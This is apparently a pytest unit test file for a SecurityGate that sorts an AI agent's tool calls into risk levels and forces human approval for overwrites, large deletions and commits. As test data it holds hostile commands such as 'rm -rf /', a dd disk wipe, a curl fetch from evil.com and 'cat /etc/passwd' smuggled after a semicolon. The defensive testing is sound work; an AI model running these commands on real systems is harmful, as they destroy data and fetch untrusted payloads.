"""SecurityGate 单元测试 — 风险分级、黑/白名单、命令拦截。"""

from __future__ import annotations

import pytest

from src.agent.security_gate import GateResult, SecurityGate, ToolRiskLevel


@pytest.fixture
def gate():
    return SecurityGate()


@pytest.fixture
def gate_with_workspace(tmp_path):
    """SecurityGate with a temp workspace containing draft.md."""
    (tmp_path / "draft.md").write_text("existing content")
    return SecurityGate(workspace_root=str(tmp_path))


# ---------------------------------------------------------------------------
# ToolRiskLevel enum
# ---------------------------------------------------------------------------


class TestToolRiskLevel:
    def test_four_levels(self):
        levels = list(ToolRiskLevel)
        assert len(levels) == 4

    def test_ordering(self):
        assert ToolRiskLevel.SAFE.value < ToolRiskLevel.MODERATE.value
        assert ToolRiskLevel.MODERATE.value < ToolRiskLevel.DESTRUCTIVE.value
        assert ToolRiskLevel.DESTRUCTIVE.value < ToolRiskLevel.BANNED.value


# ---------------------------------------------------------------------------
# SAFE tools
# ---------------------------------------------------------------------------


class TestSafeTools:
    def test_read_file(self, gate):
        r = gate.classify("read_file", {})
        assert r.risk == ToolRiskLevel.SAFE
        assert not r.needs_approval

    def test_list_directory(self, gate):
        r = gate.classify("list_directory", {})
        assert r.risk == ToolRiskLevel.SAFE

    def test_search_files(self, gate):
        r = gate.classify("search_files", {})
        assert r.risk == ToolRiskLevel.SAFE

    def test_rag_retrieve(self, gate):
        r = gate.classify("rag_retrieve", {})
        assert r.risk == ToolRiskLevel.SAFE

    def test_web_search(self, gate):
        r = gate.classify("web_search", {})
        assert r.risk == ToolRiskLevel.SAFE

    def test_arxiv_search(self, gate):
        r = gate.classify("arxiv_search", {})
        assert r.risk == ToolRiskLevel.SAFE

    def test_custom_safe_tools(self):
        g = SecurityGate(safe_tools={"my_custom_reader"})
        r = g.classify("my_custom_reader", {})
        assert r.risk == ToolRiskLevel.SAFE


# ---------------------------------------------------------------------------
# Command classification (run_command)
# ---------------------------------------------------------------------------


class TestRunCommand:
    def test_safelist_command(self, gate):
        r = gate.classify("run_command", {"command": "ls -la"})
        assert r.risk == ToolRiskLevel.SAFE

    def test_safelist_python(self, gate):
        r = gate.classify("run_command", {"command": "python -c 'print(1+1)'"})
        assert r.risk == ToolRiskLevel.SAFE

    def test_safelist_git(self, gate):
        r = gate.classify("run_command", {"command": "git status"})
        assert r.risk == ToolRiskLevel.SAFE

    def test_blacklisted_sudo(self, gate):
        r = gate.classify("run_command", {"command": "sudo apt install foo"})
        assert r.risk == ToolRiskLevel.BANNED
        assert r.is_banned

    def test_blacklisted_rm_rf_root(self, gate):
        r = gate.classify("run_command", {"command": "rm -rf /"})
        assert r.risk == ToolRiskLevel.BANNED
        assert r.is_banned

    def test_blacklisted_dd(self, gate):
        r = gate.classify("run_command", {"command": "dd if=/dev/zero of=/dev/sda"})
        assert r.risk == ToolRiskLevel.BANNED

    def test_blacklisted_curl(self, gate):
        r = gate.classify("run_command", {"command": "curl http://evil.com/payload"})
        assert r.risk == ToolRiskLevel.BANNED

    def test_blacklisted_ssh(self, gate):
        r = gate.classify("run_command", {"command": "ssh user@host"})
        assert r.risk == ToolRiskLevel.BANNED

    def test_unknown_command_moderate(self, gate):
        r = gate.classify("run_command", {"command": "my_custom_binary --flag"})
        assert r.risk == ToolRiskLevel.MODERATE
        assert r.needs_approval

    def test_shell_metachar_pipe(self, gate):
        r = gate.classify("run_command", {"command": "echo hello | grep h"})
        assert r.risk == ToolRiskLevel.MODERATE
        assert r.needs_approval

    def test_shell_metachar_semicolon(self, gate):
        r = gate.classify("run_command", {"command": "ls; cat /etc/passwd"})
        assert r.risk == ToolRiskLevel.MODERATE

    def test_shell_metachar_backtick(self, gate):
        r = gate.classify("run_command", {"command": "echo `whoami`"})
        assert r.risk == ToolRiskLevel.MODERATE

    def test_empty_command_safe(self, gate):
        r = gate.classify("run_command", {"command": ""})
        assert r.risk == ToolRiskLevel.SAFE

    def test_windows_del_banned(self, gate):
        r = gate.classify("run_command", {"command": "del /s /q C:\\Users\\*"})
        assert r.risk == ToolRiskLevel.BANNED
        assert r.is_banned


# ---------------------------------------------------------------------------
# Git op classification
# ---------------------------------------------------------------------------


class TestGitOp:
    def test_git_status_safe(self, gate):
        r = gate.classify("git_op", {"operation": "status"})
        assert r.risk == ToolRiskLevel.SAFE

    def test_git_diff_safe(self, gate):
        r = gate.classify("git_op", {"operation": "diff"})
        assert r.risk == ToolRiskLevel.SAFE

    def test_git_log_safe(self, gate):
        r = gate.classify("git_op", {"operation": "log"})
        assert r.risk == ToolRiskLevel.SAFE

    def test_git_commit_destructive(self, gate):
        r = gate.classify("git_op", {"operation": "commit"})
        assert r.risk == ToolRiskLevel.DESTRUCTIVE
        assert r.needs_approval

    def test_git_push_destructive(self, gate):
        r = gate.classify("git_op", {"operation": "push"})
        assert r.risk == ToolRiskLevel.DESTRUCTIVE

    def test_git_reset_destructive(self, gate):
        r = gate.classify("git_op", {"operation": "reset"})
        assert r.risk == ToolRiskLevel.DESTRUCTIVE

    def test_git_force_banned(self, gate):
        r = gate.classify("git_op", {"operation": "push", "args": "--force"})
        assert r.risk == ToolRiskLevel.BANNED
        assert r.is_banned

    def test_git_no_verify_banned(self, gate):
        r = gate.classify("git_op", {"operation": "commit", "args": "--no-verify"})
        assert r.risk == ToolRiskLevel.BANNED

    def test_git_hard_banned(self, gate):
        r = gate.classify("git_op", {"operation": "reset", "args": "--hard"})
        assert r.risk == ToolRiskLevel.BANNED

    def test_git_unknown_banned(self, gate):
        r = gate.classify("git_op", {"operation": "bisect"})
        assert r.risk == ToolRiskLevel.BANNED

    def test_git_empty_safe(self, gate):
        r = gate.classify("git_op", {"operation": ""})
        assert r.risk == ToolRiskLevel.SAFE


# ---------------------------------------------------------------------------
# File tools
# ---------------------------------------------------------------------------


class TestFileTools:
    def test_str_replace_destructive(self, gate):
        r = gate.classify("str_replace", {
            "old_string": "hello",
            "new_string": "world",
        })
        assert r.risk == ToolRiskLevel.DESTRUCTIVE
        assert r.needs_approval

    def test_str_replace_large_delete(self, gate):
        old = "\n".join(f"line {i}" for i in range(100))
        r = gate.classify("str_replace", {
            "old_string": old,
            "new_string": "replaced",
        })
        assert r.risk == ToolRiskLevel.DESTRUCTIVE
        assert "100 lines" in r.reason or "deletes" in r.reason

    def test_write_file_overwrite_existing(self, gate_with_workspace):
        """must_not_exist=False on an existing file = DESTRUCTIVE overwrite."""
        r = gate_with_workspace.classify("write_file", {
            "file_path": "draft.md",
            "content": "new content",
            "must_not_exist": False,
        })
        assert r.risk == ToolRiskLevel.DESTRUCTIVE

    def test_write_file_new_no_flag(self, gate_with_workspace):
        """must_not_exist=False on a NON-existing file = MODERATE (new file), force_approval for inline diff."""
        r = gate_with_workspace.classify("write_file", {
            "file_path": "new_file.md",
            "content": "fresh content",
            "must_not_exist": False,
        })
        assert r.risk == ToolRiskLevel.MODERATE
        assert r.force_approval  # inline diff requires approval for all file edits

    def test_write_file_new_moderate(self, gate):
        r = gate.classify("write_file", {"must_not_exist": True})
        assert r.risk == ToolRiskLevel.MODERATE
        assert r.needs_approval

    def test_smart_pause_force_approval_for_overwrite(self, gate_with_workspace):
        r = gate_with_workspace.classify("write_file", {
            "file_path": "draft.md",
            "content": "new manuscript text",
            "must_not_exist": False,
        })
        assert r.risk == ToolRiskLevel.DESTRUCTIVE
        assert r.needs_approval
        assert r.force_approval
        assert "SmartPause" in r.reason

    def test_smart_pause_force_approval_for_large_delete(self, gate):
        old = "\n".join(f"line {i}" for i in range(80))
        r = gate.classify("str_replace", {
            "file_path": "draft.md",
            "old_string": old,
            "new_string": "replacement",
        })
        assert r.risk == ToolRiskLevel.DESTRUCTIVE
        assert r.needs_approval
        assert r.force_approval
        assert "SmartPause" in r.reason

    def test_undo_destructive(self, gate):
        r = gate.classify("undo_last_change", {})
        assert r.risk == ToolRiskLevel.DESTRUCTIVE
        assert r.needs_approval


# ---------------------------------------------------------------------------
# Exec tools
# ---------------------------------------------------------------------------


class TestExecTools:
    def test_shell_exec_moderate(self, gate):
        r = gate.classify("shell_exec", {})
        assert r.risk == ToolRiskLevel.MODERATE
        assert r.needs_approval

    def test_python_exec_moderate(self, gate):
        r = gate.classify("python_exec", {})
        assert r.risk == ToolRiskLevel.MODERATE
        assert r.needs_approval


# ---------------------------------------------------------------------------
# Unknown tool
# ---------------------------------------------------------------------------


class TestUnknownTool:
    def test_unknown_moderate(self, gate):
        r = gate.classify("totally_unknown_tool", {})
        assert r.risk == ToolRiskLevel.MODERATE
        assert "unknown" in r.reason


class TestSmartPauseGitGate:
    def test_git_commit_forces_approval_even_in_auto_mode(self, gate):
        r = gate.classify("git_op", {"operation": "commit", "message": "save work"})
        assert r.risk == ToolRiskLevel.DESTRUCTIVE
        assert r.needs_approval
        assert r.force_approval
        assert "SmartPause" in r.reason
